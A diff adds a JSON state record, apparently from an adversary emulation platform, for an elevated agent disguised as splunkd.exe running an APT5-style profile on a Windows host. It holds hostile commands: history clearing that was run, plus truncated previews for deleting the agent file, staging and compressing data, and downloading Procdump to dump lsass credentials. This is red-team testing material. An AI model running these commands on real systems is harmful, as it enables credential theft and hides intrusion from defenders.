@@ -1,0 +1,273 @@
+{
+  "selected_agent": {
+    "paw": "zqahqp",
+    "sleep_min": 30,
+    "sleep_max": 60,
+    "watchdog": 0,
+    "group": "red",
+    "architecture": "amd64",
+    "platform": "windows",
+    "server": "http://192.168.30.45:8888",
+    "upstream_dest": "http://192.168.30.45:8888",
+    "username": "FINCORP\\Administrator",
+    "location": "C:\\Users\\Public\\splunkd.exe",
+    "pid": 2464,
+    "ppid": 7616,
+    "trusted": true,
+    "executors": [
+      "cmd",
+      "psh",
+      "proc"
+    ],
+    "privilege": "Elevated",
+    "exe_name": "splunkd.exe",
+    "host": "PDL2",
+    "contact": "HTTP",
+    "proxy_receivers": {},
+    "proxy_chain": [],
+    "origin_link_id": "",
+    "deadman_enabled": true,
+    "available_contacts": [
+      "HTTP"
+    ],
+    "host_ip_addrs": [
+      "10.3.10.101",
+      "192.168.30.61"
+    ],
+    "display_name": "PDL2$FINCORP\\Administrator",
+    "created": "2026-04-02T10:15:09Z",
+    "last_seen": "2026-04-02T10:20:49Z",
+    "links": [
+      {
+        "id": "9e3da2ae-e9ca-490c-ac1c-89d2aadc360a",
+        "paw": "zqahqp",
+        "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "status": 0,
+        "score": 0,
+        "jitter": 0,
+        "decide": "2026-04-02T10:15:09Z",
+        "pin": 0,
+        "pid": "8712",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "9e3da2ae-e9ca-490c-ac1c-89d2aadc360a",
+        "collect": "2026-04-02T10:15:09Z",
+        "finish": "2026-04-02T10:15:11Z",
+        "ability": {
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "tactic": "defense-evasion",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "technique_id": "T1070.003",
+          "name": "Avoid logs",
+          "description": "Stop terminal from logging history",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "sh",
+              "platform": "linux",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Clear-History;Clear",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "PDL2",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T10:15:07Z"
+      }
+    ],
+    "pending_contact": "HTTP",
+    "status": "alive"
+  },
+  "selected_adversary": {
+    "adversary_id": "c23f2861-b01c-4be4-a883-dd65855f9c3f",
+    "name": "APT5 Auto Profile Windows",
+    "description": "Adversary profile generato automaticamente da MITRE ATT&CK per APT5 su piattaforma Windows.",
+    "atomic_ordering": [
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "a42dfc86-12f0-4f06-b0cf-24830c7f61f4",
+      "43b3754c-def4-4699-a673-1d85648fda6a",
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+      "05cda6f6-2b1b-462e-bff1-845af94343f7",
+      "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "30a8cf10-73dc-497c-8261-a64cc9e91505"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "plugin": "stockpile"
+  },
+  "operation_adversary": {
+    "adversary_id": "temp-seed-zqahqp-1775125295",
+    "name": "Temp Seed Windows - APT5 Auto Profile Windows",
+    "description": "Auto-generated seed adversary from c23f2861-b01c-4be4-a883-dd65855f9c3f for agent zqahqp",
+    "atomic_ordering": [
+      "05cda6f6-2b1b-462e-bff1-845af94343f7",
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+      "30a8cf10-73dc-497c-8261-a64cc9e91505",
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+      "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc"
+    ]
+  },
+  "temp_adversary_info": {
+    "saved": true,
+    "adversary": {
+      "adversary_id": "temp-seed-zqahqp-1775125295",
+      "name": "Temp Seed Windows - APT5 Auto Profile Windows",
+      "description": "Auto-generated seed adversary from c23f2861-b01c-4be4-a883-dd65855f9c3f for agent zqahqp",
+      "atomic_ordering": [
+        "05cda6f6-2b1b-462e-bff1-845af94343f7",
+        "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+        "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+        "30a8cf10-73dc-497c-8261-a64cc9e91505",
+        "6469befa-748a-4b9c-a96d-f191fde47d89",
+        "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+        "0ef4cc7b-611c-4237-b20b-db36b6906554",
+        "315cedf1-4a3a-4015-b63f-149d64bacbbc"
+      ]
+    },
+    "selected_abilities": [
+      {
+        "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+        "name": "Discover injectable process",
+        "tactic": "discovery",
+        "technique_id": "T1057",
+        "noisy_score": 9,
+        "command_preview": "$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; $ps = get-process |…"
+      },
+      {
+        "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+        "name": "Deadman - Delete agent file",
+        "tactic": "defense-evasion",
+        "technique_id": "T1070.004",
+        "noisy_score": 3,
+        "command_preview": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup; $startupInfo = New-CimInstance -CimCl…"
+      },
+      {
+        "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+        "name": "Find System Network Connections",
+        "tactic": "discovery",
+        "technique_id": "T1049",
+        "noisy_score": 3,
+        "command_preview": "netstat -anto; Get-NetTCPConnection"
+      },
+      {
+        "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505",
+        "name": "Compress staged directory (Password Protected)",
+        "tactic": "collection",
+        "technique_id": "T1560.001",
+        "noisy_score": 1,
+        "command_preview": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archiv…"
+      },
+      {
+        "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+        "name": "Create staging directory",
+        "tactic": "collection",
+        "technique_id": "T1074.001",
+        "noisy_score": 1,
+        "command_preview": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Obj…"
+      },
+      {
+        "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+        "name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "technique_id": "T1083",
+        "noisy_score": 1,
+        "command_preview": "Get-ChildItem -Path #{host.system.path}"
+      },
+      {
+        "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
+        "name": "Leverage Procdump for lsass memory",
+        "tactic": "credential-access",
+        "technique_id": "T1003.001",
+        "noisy_score": 1,
+        "command_preview": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\"; $download_folder = \"C:\\Users\\Publ…"
+      },
+      {
+        "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+        "name": "Emulate Administrator Tasks",
+        "tactic": "execution",
+        "technique_id": "T1059.001",
+        "noisy_score": 0,
+        "command_preview": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrat…"
+      }
+    ]
+  }
+}
